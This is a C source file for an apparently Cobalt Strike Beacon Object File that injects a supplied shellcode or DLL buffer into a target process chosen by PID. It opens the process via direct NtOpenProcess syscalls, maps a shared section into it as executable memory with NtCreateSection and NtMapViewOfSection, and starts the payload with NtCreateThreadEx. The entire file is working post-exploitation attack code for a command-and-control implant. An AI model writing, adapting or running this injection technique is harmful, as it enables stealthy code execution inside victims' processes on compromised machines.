#include <windows.h>
#include "beacon.h"
#include "syscalls.c"


/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

/* is this a 64-bit or 32-bit process? */
BOOL is_wow64(HANDLE process) {
   BOOL bIsWow64 = FALSE;

   if (!KERNEL32$IsWow64Process(process, &bIsWow64)) {
      return FALSE;
   }
   return bIsWow64;
}

/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
   if (is_x64() || is_wow64(KERNEL32$GetCurrentProcess())) {
      return !is_wow64(process);
   }

   return FALSE;
}

/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   HANDLE              hProcess;
   datap               parser;
   int                 pid;
   int                 offset;
   char *              dllPtr;
   int                 dllLen;


   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   pid = BeaconDataInt(&parser);
   offset = BeaconDataInt(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);


   //NtOpenProcess
   CLIENT_ID cid;
   cid.UniqueProcess = (HANDLE)pid;
   cid.UniqueThread = (HANDLE)0;

   OBJECT_ATTRIBUTES oattr;
   InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);

   NTSTATUS status = NtOpenProcess(
      &hProcess,
      PROCESS_ALL_ACCESS,
      &oattr,
      &cid);
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtOpenProcess failed with error code: 0x%X", status);
      return;
   }

   /* Check that we can inject the content into the process. */
   if (!is_x64_process(hProcess) && x86 == FALSE ) {
      BeaconPrintf(CALLBACK_ERROR, "%d is an x86 process (can't inject x64 content)", pid);
      return;
   }
   if (is_x64_process(hProcess) && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "%d is an x64 process (can't inject x86 content)", pid);
      return;
   }

   /* Use NtCreateSection, NtMapViewOfSection and NtCreateThreadEx*/
   //NtCreateSection
   HANDLE shand;
   LARGE_INTEGER sc_size = { dllLen };

   status = NtCreateSection(
      &shand,
      SECTION_ALL_ACCESS,
      &oattr,
      &sc_size,
      PAGE_EXECUTE_READWRITE,
      SEC_COMMIT,
      NULL
   );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtCreateSection failed with error code: 0x%X", status);
      return;
   }

   //NtMapViewOfSection to local process
   PVOID local_mem = NULL;
   SIZE_T vSize = 0;

   status = NtMapViewOfSection(
      shand,
      KERNEL32$GetCurrentProcess(),
      &local_mem,
      NULL,
      NULL,
      NULL,
      &vSize,
      2,
      NULL,
      PAGE_READWRITE
   );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtMapViewOfSection to local process failed with error code: 0x%X", status);
      return;
   }

   mymemcopy(local_mem, dllPtr, dllLen);

   //NtMapViewOfSection to the opened process
   PVOID remote_mem = NULL;

   status = NtMapViewOfSection(
      shand,
      hProcess,
      &remote_mem,
      NULL,
      NULL,
      NULL,
      &vSize,
      2,
      NULL,
      PAGE_EXECUTE_READ
   );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtMapViewOfSection to remote process failed with error code: 0x%X", status);
      return;
   }

   //Execute shellcode trough NtCreateThreadEx
   HANDLE thand;

   status = NtCreateThreadEx(
      &thand,
      STANDARD_RIGHTS_ALL,
      NULL,
      hProcess,
      remote_mem,
      NULL,
      0,   //false
      NULL,
      NULL,
      NULL,
      NULL
   );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtCreateThreadEx failed with error code: 0x%X", status);
      return;
   }

   //Unmap the created section from the local process
   status = NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), local_mem);
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtUnmapViewOfSection failed with error code: 0x%X", status);
      return;
   }


   /* Clean up */
   NtClose(hProcess);
   NtClose(thand);
   NtClose(shand);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}
